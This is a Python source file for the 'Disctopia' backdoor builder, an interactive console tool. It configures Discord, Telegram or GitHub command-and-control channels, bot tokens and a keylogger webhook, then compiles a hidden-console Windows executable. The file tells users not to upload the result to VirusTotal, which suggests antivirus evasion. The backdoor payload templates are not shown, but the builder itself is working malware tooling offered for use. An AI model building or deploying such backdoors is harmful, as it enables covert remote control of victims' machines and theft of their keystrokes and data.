# -*- coding: utf-8 -*-

import json
import subprocess
import os
import argparse
import distro
from prettytable import PrettyTable
from sys import platform as OS
import requests
import time
import sys

def clear_screen():
    if OS == "linux" or OS == "linux2":
        os.system("clear")

clear_screen()

print('''
▓█████▄  ██▓  ██████  ▄████▄  ▄▄▄█████▓ ▒█████   ██▓███   ██▓ ▄▄▄      
▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▓  ██▒ ▓▒▒██▒  ██▒▓██░  ██▒▓██▒▒████▄    
░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒ ▓██░ ▒░▒██░  ██▒▓██░ ██▓▒▒██▒▒██  ▀█▄  
░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██   ██░▒██▄█▓▒ ▒░██░░██▄▄▄▄██ 
░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░  ▒██▒ ░ ░ ████▓▒░▒██▒ ░  ░░██░ ▓█   ▓██▒
 ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░  ▒ ░░   ░ ▒░▒░▒░ ▒▓▒░ ░  ░░▓   ▒▒   ▓▒█░
 ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒       ░      ░ ▒ ▒░ ░▒ ░      ▒ ░  ▒   ▒▒ ░
 ░ ░  ░  ▒ ░░  ░  ░  ░          ░      ░ ░ ░ ▒  ░░        ▒ ░  ░   ▒   
   ░     ░        ░  ░ ░                   ░ ░            ░        ░  ░ v2.1.2
 ░                   ░                                                 

Made by Dimitris Kalopisis aka Ectos | Twitter: @DKalopisis \n\nRun 'help use' to get started!''')

list = ["None", "None", "None", "None", "None"]

def createTable(list):
    table = PrettyTable(["Setting", "Value"])
    table.add_row(["Backdoor Name", list[0]])

    if payload == "discord":
        table.add_row(["Guild ID", list[1]])
        table.add_row(["Bot Token", list[2]])
        table.add_row(["Channel ID", list[3]])
        table.add_row(["Keylogger Webhook", list[4]])
    elif payload == "telegram":
        table.add_row(["User ID", list[1]])
        table.add_row(["Bot Token", list[2]])
    elif payload == "github":
        table.add_row(["Github Token", list[1]])
        table.add_row(["Github Repo", list[2]])
    else:
        print("[!] Please select a payload payload!\n")
    return table


payload = ""
try:
    while True:
        
        command = input(f"[+] {payload} > ")
        command_list = command.split()

        if command_list == []:
            continue

        if command_list[0] == "exit":
            print("\n[+] Exiting!")
            exit()

        elif command_list[0] == "use":
            if len(command_list) == 1:
                print("[!] Please specify a payload!")
            else:
                if command_list[1] == "discord":
                    print("[+] Using Discord C2")
                    payload = "discord"
                    table = createTable(list)    
                    print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                    print("Run 'help set' for more information\n")
                elif command_list[1] == "telegram":
                    print("[+] Using Telegram C2")
                    payload = "telegram"
                    table = createTable(list)    
                    print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                    print("Run 'help set' for more information\n")
                elif command_list[1] == "github":
                    print("[+] Using Github C2")
                    payload = "github"
                    table = createTable(list)    
                    print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                    print("Run 'help set' for more information\n")
                else:
                    print("[!] Invalid payload!")

        elif command_list[0] == "set":
            if len(command_list) < 3:
                print("[!] Please specify a setting!\n")
            else:
                if command_list[1] == "name":
                    list[0] = command_list[2]

                elif command_list[1] == "guild-id":
                    list[1] = command_list[2]

                elif command_list[1] == "bot-token":
                    list[2] = command_list[2]

                elif command_list[1] == "channel-id":
                    list[3] = command_list[2]

                elif command_list[1] == "user-id":
                    list[1] = command_list[2]

                elif command_list[1] == "github-token":
                    list[1] = command_list[2]

                elif command_list[1] == "github-repo":
                    list[2] = command_list[2]

                elif command_list[1] == "webhook":
                    list[4] = command_list[2]
                else:
                    print("[!] Invalid setting!\n")

        elif command_list[0] == "config":
            if payload == "":
                print("[!] Please select a payload!\n")
            else:
                table = createTable(list)
                print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                print("Run 'help set' for more information\n")

        elif command_list[0] == "clear":
            clear_screen()

        elif command_list[0] == "help":
            if len(command_list) == 1:
                print('''\n
        Help Menu:

        "help <command>" Displays more help for a specific command 

        "use <payload>" Selects a payload to use

        "set <setting> <value>" Sets a value to a valid setting

        "config" Shows the settings and their values

        "build" Packages the backdoor into an EXE file

        "update" Gets the latest version of Disctopia

        "exit" Terminates the builder
                    \n''')
            else:
                if command_list[1] == "use":
                    print('''\n
        Help Menu:

        "use <payload>" Selects a payload to use

        Payloads:

        "discord" - A Discord based C2
        "telegram" - A telegram based C2
        "github" - A github based C2
                        ''')
                elif command_list[1] == "set":
                    if payload == "":
                        print("[!] Please select a payload!\n")
                    else:
                        if payload == "discord":
                            print('''\n
        Help Menu:

        "set <setting> <value>" Sets a value to a valid setting

        Settings:

        "name" - The name of the backdoor
        "guild-id" - The ID of the Discord server
        "bot-token" - The token of the Discord bot
        "channel-id" - The ID of the Discord channel
        "webhook" - The webhook for the keylogger
                            ''')
                        elif payload == "telegram":
                            print('''\n
        Help Menu:

        "set <setting> <value>" Sets a value to a valid setting

        Settings:

        "name" - The name of the backdoor
        "bot-token" - The token of the Telegram bot
        "user-id" - The ID of the Telegram user

        IMPORTANT: This can only be used with one agent online at a time!
                            ''')

                        elif payload == "github":
                            print('''\n
        Help Menu:

        "set <setting> <value>" Sets a value to a valid setting

        Settings:

        "name" - The name of the backdoor
        "github-token" - The token of the Github bot
        "github-repo" - The name of the Github repo
                            ''')
                elif command_list[1] == "build" or command_list[1] == "update" or command_list[1] == "exit" or command_list[1] == "config" or command_list[1] == "clear":
                    print("[!] There is nothing more to show!\n")
                else:
                    print("[!] Invalid command!\n")

        elif command_list[0] == "build":
            print("[?] Are you sure you want to build the backdoor? (y/n)")
            input = input()
            if input == "y":
                print("[+] Building backdoor...")
                if payload == "discord":
                    f = open("code/discord/main.py", 'r')
                    file = f.read()
                    f.close()
                    newfile = file.replace("{GUILD}", str(list[1]))
                    newfile = newfile.replace("{TOKEN}", str(list[2]))
                    newfile = newfile.replace("{CHANNEL}", str(list[3]))
                    newfile = newfile.replace("{KEYLOG_WEBHOOK}", str(list[4]))

                elif payload == "telegram":
                    f = open("code/telegram/main.py", 'r')
                    file = f.read()
                    f.close()
                    newfile = file.replace("{BOT_TOKEN}", str(list[2]))
                    newfile = newfile.replace("{USER_ID}", str(list[1]))

                elif payload == "github":
                    f = open("code/github/main.py", 'r')
                    file = f.read()
                    f.close()
                    newfile = file.replace("{TOKEN}", str(list[1]))
                    newfile = newfile.replace("{REPO}", str(list[2]))
                

                f = open(list[0]+".py", 'w')
                f.write(newfile)
                f.close()

                if os.path.exists('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe'):
                    path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
                else:
                    path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
                
                if "Arch" in distro.name() or "Manjaro" in distro.name():
                    path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
                compile_command = ["wine", path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", list[0]+".py"]

                subprocess.call(compile_command)
                try:
                    os.remove(list[0]+".py");os.remove(list[0]+".spec")
                except FileNotFoundError:
                    pass
                print('\n[+] The Backdoor can be found inside the "dist" directory')
                print('\nDO NOT UPLOAD THE BACKDOOR TO VIRUS TOTAL')
                exit()

        elif command_list[0] == "update":
            url = f'https://api.github.com/repos/3ct0s/disctopia-c2/releases/latest'
            response = requests.get(url)
            latest_tag = response.json()['tag_name']

            cmd = ['git', 'describe', '--tags']
            current_tag = subprocess.check_output(cmd).decode('utf-8').strip()

            if current_tag == latest_tag:
                print('[!] Code is up to date')
            else:
                print('[!] Updating code...')

                cmd = ['git', 'reset', '--hard', 'HEAD']
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                cmd = ['git', 'fetch', '--tags', '--prune']
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                cmd = ['git', 'pull', '--ff-only']
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                cmd = ['git', 'checkout', latest_tag]
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                print(f'[!] Code has been updated to {latest_tag}')
                print('[*] Quitting...')
                exit()


        else:
            print("[!] Invalid command!\n")

except KeyboardInterrupt:
    print("\n\n[+] Exiting")
